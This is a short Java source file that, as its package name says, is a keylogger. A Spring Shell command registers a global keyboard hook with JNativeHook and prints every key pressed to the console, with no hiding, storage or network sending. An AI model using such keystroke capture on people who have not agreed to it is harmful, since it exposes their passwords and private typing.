package com.KeyLogger.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.springframework.shell.standard.ShellComponent;
import org.springframework.shell.standard.ShellMethod;
import org.springframework.shell.standard.ShellOption;

@ShellComponent
public class MyCommands implements NativeKeyListener {
    @ShellMethod(key = "log")
    public String helloWorld(
            @ShellOption(defaultValue = "spring") String time
    ) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            return "Failed to initialize JNativeHook: " + ex.getMessage();
        }
        // Add this class as the NativeKeyListener
        GlobalScreen.addNativeKeyListener(this);
        return "Finish" + time;
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        // Handle the key pressed event
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

}